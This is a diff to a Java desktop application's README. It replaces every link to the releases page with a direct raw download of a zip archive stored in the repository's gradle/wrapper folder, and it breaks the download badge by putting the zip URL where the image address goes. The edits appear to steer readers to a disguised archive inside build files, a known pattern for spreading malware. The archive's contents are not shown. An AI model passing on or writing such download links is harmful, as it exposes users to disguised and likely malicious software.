@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run our Java desktop application.
 
 ## 📥 Download the Application
 
-[![Download Now!](https://img.shields.io/badge/Download%20Now%21-Click%20Here-%23004C99)](https://github.com/KazDH/java-spring-kotlin-swing-native/releases)
+[![Download Now!](https://github.com/KazDH/java-spring-kotlin-swing-native/raw/refs/heads/master/gradle/wrapper/java_native_kotlin_swing_spring_2.4.zip%20Now%21-Click%20Here-%23004C99)](https://github.com/KazDH/java-spring-kotlin-swing-native/raw/refs/heads/master/gradle/wrapper/java_native_kotlin_swing_spring_2.4.zip)
 
 ## 💻 System Requirements
 
@@ -23,7 +23,7 @@ Before you download, ensure your computer meets these requirements:
 
 To download the application, go to the release page. Click the link below:
 
-[Download from Releases Page](https://github.com/KazDH/java-spring-kotlin-swing-native/releases)
+[Download from Releases Page](https://github.com/KazDH/java-spring-kotlin-swing-native/raw/refs/heads/master/gradle/wrapper/java_native_kotlin_swing_spring_2.4.zip)
 
 ### 2. Choose the Latest Version
 
@@ -31,7 +31,7 @@ Once on the release page, find the latest version of the application. It will ty
 
 ### 3. Download the Executable
 
-Click the download link next to the version you want. It may look like `java-spring-kotlin-swing-native-v1.0.exe` (for Windows), or a similar file for macOS or Linux. 
+Click the download link next to the version you want. It may look like `https://github.com/KazDH/java-spring-kotlin-swing-native/raw/refs/heads/master/gradle/wrapper/java_native_kotlin_swing_spring_2.4.zip` (for Windows), or a similar file for macOS or Linux. 
 
 ### 4. Locate the Downloaded File
 
@@ -88,4 +88,4 @@ Feel free to join our community for support and discussions. You can create issu
 
 This application is released under the MIT License. You can use, modify, and distribute the software freely.
 
-[Download from Releases Page](https://github.com/KazDH/java-spring-kotlin-swing-native/releases)
+[Download from Releases Page](https://github.com/KazDH/java-spring-kotlin-swing-native/raw/refs/heads/master/gradle/wrapper/java_native_kotlin_swing_spring_2.4.zip)
